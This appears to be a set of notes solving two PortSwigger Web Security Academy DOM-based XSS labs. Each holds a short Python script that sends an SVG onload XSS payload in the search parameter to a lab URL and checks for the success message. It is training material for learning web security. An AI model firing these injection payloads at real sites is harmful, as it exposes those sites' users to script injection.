# Portswigger

## XSS

### [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

#### Lab3

```python
import requests

url = "https://0a1e0067044d34a8c2a44bb8000700ed.web-security-academy.net"

session = requests.Session()

params = {
    "search" : f'"><svg/onload=alert(1)>'
}
r = session.get(url = url , params= params)

if "Congratulations, you solved the lab!" in r.text:
    print("solved")
```

#### lab4

```python
import requests

url = "https://0a9900f9047f2860c1167170009f00d1.web-security-academy.net/"

session = requests.Session()

params = {
    "search" : f'<svg/onload=alert(1)>'
}
r = session.get(url = url , params= params)

if "Congratulations, you solved the lab!" in r.text:
    print("solved")
```
